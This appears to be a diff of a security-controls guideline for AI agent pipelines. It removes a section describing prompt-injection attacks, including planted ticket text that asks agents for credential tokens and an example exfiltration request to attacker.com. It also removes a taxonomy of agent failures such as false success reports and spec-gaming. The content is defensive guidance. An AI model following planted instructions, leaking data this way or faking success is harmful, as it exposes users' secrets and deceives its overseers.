@@ -29,19 +29,6 @@ instructions the model may execute.
 
 A RAG pipeline with tool use satisfies all three conditions by design.
 
-### Named attack patterns
-
-**AgentFlayer**: malicious content in Jira tickets / GitHub issues requests credential tokens
-and instructs the agent to post results as public comments. Requires no code execution —
-the attack is entirely data-driven through crafted text.
-
-**Image exfiltration**: `GET https://attacker.com/img.png?data=[stolen]` exfiltrates data
-via request parameters. Even read-only HTTP access enables this. Allowing arbitrary image
-loading is an exfiltration channel.
-
-**MCP supply chain**: hosted MCP servers may silently exfiltrate data to third parties.
-Unmaintained or maliciously authored plugins introduce traditional supply-chain vectors.
-
 ## Required Controls
 
 ### 1. Content source trust classification (non-negotiable)
@@ -111,34 +98,6 @@ When confidence is low or a request is outside the agent's reliable capability:
 
 "Genie risk": agents that exploit specification gaps without signalling them are a failure
 mode, not a feature. Require agents to surface ambiguity at the task boundary.
-
-## Agent Behaviour Failure Taxonomy
-
-These are failure modes not detectable by system error sensors. They require
-behavioural sensors (semantic guardrails, run review, human review at task boundary):
-
-| Failure mode | Description | Detection approach |
-|---|---|---|
-| **Overeagerness** | Generates unrequested features or business logic inferred from domain terms | Semantic guardrails; scope review at task boundary |
-| **Assumption filling** | Fills spec gaps autonomously without signalling; produces production problems without system error | Require explicit ambiguity surfacing; adversarial eval scenarios |
-| **Brute-force fix** | Applies hacky solutions (increase memory, add annotations) rather than root-cause fixes | Static analysis sensors; code review gates |
-| **False success signal** | Reports task complete despite failing tests or violated constraints | Require verification command output in completion signal |
-| **Genie risk** | Exploits spec loopholes; gives what was asked for in an unexpected way | Human review at task boundary; adversarial specification tests |
-| **Code quality drift** | Duplicated literals, unused parameters, improper patterns, nested conditionals | Static analysis as a required sensor type |
-
-### Capability-Fit Review Sensor
-
-Capability-fit failure is a behavioural class, not a syntax error. The required review question at
-task boundary / code review is:
-
-- Is this task explicit derivation or semantic inference?
-- If inference is present, why is the mechanism not AI-driven?
-- If the solution is AI-driven, what makes deterministic derivation insufficient or misleading?
-- If the solution is deterministic, what exact explicit structure in the source makes fixed-rule recovery valid?
-
-This sensor is specifically aimed at two mirror-image failures:
-- bespoke deterministic machinery solving a semantic problem,
-- or model use where exact deterministic derivation was available.
 
 ## Multi-Agent Trust
 
